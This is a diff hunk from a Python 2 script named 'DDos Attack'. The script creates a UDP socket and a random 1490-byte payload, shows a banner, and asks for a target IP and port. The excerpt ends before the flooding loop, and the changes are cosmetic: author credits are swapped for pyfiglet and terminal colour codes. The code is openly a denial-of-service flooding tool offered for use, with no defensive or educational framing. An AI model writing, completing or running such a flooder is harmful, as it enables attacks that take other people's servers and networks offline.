@@ -17,11 +17,14 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
+
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : zhicco"
-print "github   : https://github.com/zhicco234"
+title=pyfiglet.figlet_format("DDos Attack")
+p = "\33[37;1m"
+h = "\33[32;1m"
+m = "\33[31;1m"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
